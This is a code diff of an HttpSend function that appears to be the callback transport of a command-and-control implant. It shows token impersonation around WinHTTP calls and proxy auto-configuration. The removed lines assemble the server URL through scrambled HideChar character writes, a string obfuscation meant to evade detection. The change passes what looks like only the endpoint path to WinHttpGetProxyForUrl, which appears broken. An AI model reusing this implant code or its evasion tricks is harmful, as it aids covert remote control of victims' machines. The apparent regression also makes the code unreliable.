@@ -15,8 +15,6 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     LPWSTR  HttpEndpoint    = NULL;
     DWORD   HttpFlags       = 0;
     LPCWSTR HttpProxy       = NULL;
-    LPWSTR  HttpUrl         = NULL;
-    SIZE_T  HttpUrlLen      = 0;
     PWSTR HttpScheme        = NULL;
 
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
@@ -30,11 +28,6 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     PVOID   RespBuffer      = NULL;
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
-
-    WCHAR   https   [ 6 ]   = { 0 };
-    WCHAR   http    [ 5 ]   = { 0 };
-    WCHAR   format_1[ 10 ]  = { 0 };
-    WCHAR   format_2[ 13 ]  = { 0 };
 
     /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
     TokenImpersonate( FALSE );
@@ -195,92 +188,11 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                 else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 )
                 {
                     // IE is set to "Use automatic proxy configuration"
-                    AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_CONFIG_URL;
-                    AutoProxyOptions.lpszAutoConfigUrl      = ProxyConfig.lpszAutoConfigUrl;
-                    AutoProxyOptions.dwAutoDetectFlags      = 0;
+                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
+                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
+                    AutoProxyOptions.dwAutoDetectFlags = 0;
 
-                    // Calculate max URL length
-                    // 15 == len("https://" + ":65535" + "\x00")
-                    HttpUrlLen = ( 15 + StringLengthW( Instance.Config.Transport.Host->Host ) + StringLengthW( HttpEndpoint ) );
-                    HttpUrl    = Instance.Win32.LocalAlloc( LPTR, HttpUrlLen * sizeof( WCHAR ) );
-
-                    if ( Instance.Config.Transport.Secure )
-                    {
-                        https[ 5 ] = HideChar( '\0' );
-                        https[ 3 ] = HideChar( 'p' );
-                        https[ 1 ] = HideChar( 't' );
-                        https[ 0 ] = HideChar( 'h' );
-                        https[ 4 ] = HideChar( 's' );
-                        https[ 2 ] = HideChar( 't' );
-                        HttpScheme = https;
-                    }
-                    else
-                    {
-                        http[ 4 ] = HideChar( '\0' );
-                        http[ 3 ] = HideChar( 'p' );
-                        http[ 1 ] = HideChar( 't' );
-                        http[ 0 ] = HideChar( 'h' );
-                        http[ 2 ] = HideChar( 't' );
-                        HttpScheme = http;
-                    }
-
-                    if ( ( Instance.Config.Transport.Host->Port == 80 && ! Instance.Config.Transport.Secure ) || ( Instance.Config.Transport.Host->Port == 443 && Instance.Config.Transport.Secure ) )
-                    {
-                        // %s://%s%s
-                        format_1[ 4 ] = HideChar( '/' );
-                        format_1[ 6 ] = HideChar( 's' );
-                        format_1[ 7 ] = HideChar( '%' );
-                        format_1[ 5 ] = HideChar( '%' );
-                        format_1[ 1 ] = HideChar( 's' );
-                        format_1[ 2 ] = HideChar( ':' );
-                        format_1[ 9 ] = HideChar( '\0' );
-                        format_1[ 8 ] = HideChar( 's' );
-                        format_1[ 0 ] = HideChar( '%' );
-                        format_1[ 3 ] = HideChar( '/' );
-
-                        Success = -1 != Instance.Win32.swprintf_s( HttpUrl, HttpUrlLen, format_1, HttpScheme, Instance.Config.Transport.Host->Host, HttpEndpoint );
-
-                        MemZero( format_1, sizeof( format_1 ) );
-
-                        if ( Instance.Config.Transport.Secure )
-                            MemZero( https, sizeof( https ) );
-                        else
-                            MemZero( http, sizeof( http ) );
-
-                        if ( ! Success )
-                            goto LEAVE;
-                    }
-                    else
-                    {
-                        // %s://%s:%d%s
-                        format_2[ 5  ] = HideChar( '%' );
-                        format_2[ 3  ] = HideChar( '/' );
-                        format_2[ 12 ] = HideChar( '\0' );
-                        format_2[ 0  ] = HideChar( '%' );
-                        format_2[ 2  ] = HideChar( ':' );
-                        format_2[ 4  ] = HideChar( '/' );
-                        format_2[ 11 ] = HideChar( 's' );
-                        format_2[ 10 ] = HideChar( '%' );
-                        format_2[ 1  ] = HideChar( 's' );
-                        format_2[ 8  ] = HideChar( '%' );
-                        format_2[ 7  ] = HideChar( ':' );
-                        format_2[ 6  ] = HideChar( 's' );
-                        format_2[ 9  ] = HideChar( 'd' );
-
-                        Success = -1 != Instance.Win32.swprintf_s( HttpUrl, HttpUrlLen, format_2, HttpScheme, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port, HttpEndpoint );
-
-                        MemZero( format_2, sizeof( format_2 ) );
-
-                        if ( Instance.Config.Transport.Secure )
-                            MemZero( https, sizeof( https ) );
-                        else
-                            MemZero( http, sizeof( http ) );
-
-                        if ( ! Success )
-                            goto LEAVE;
-                    }
-
-                    if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpUrl, &AutoProxyOptions, &ProxyInfo ) )
+                    if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
                     {
                         if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( ProxyInfo ) ) )
                         {
@@ -368,8 +280,6 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
     if ( ProxyConfig.lpszAutoConfigUrl )
         Instance.Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
-
-    DATA_FREE( HttpUrl, HttpUrlLen * sizeof( WCHAR ) );
 
     /* re-impersonate the token */
     TokenImpersonate( TRUE );
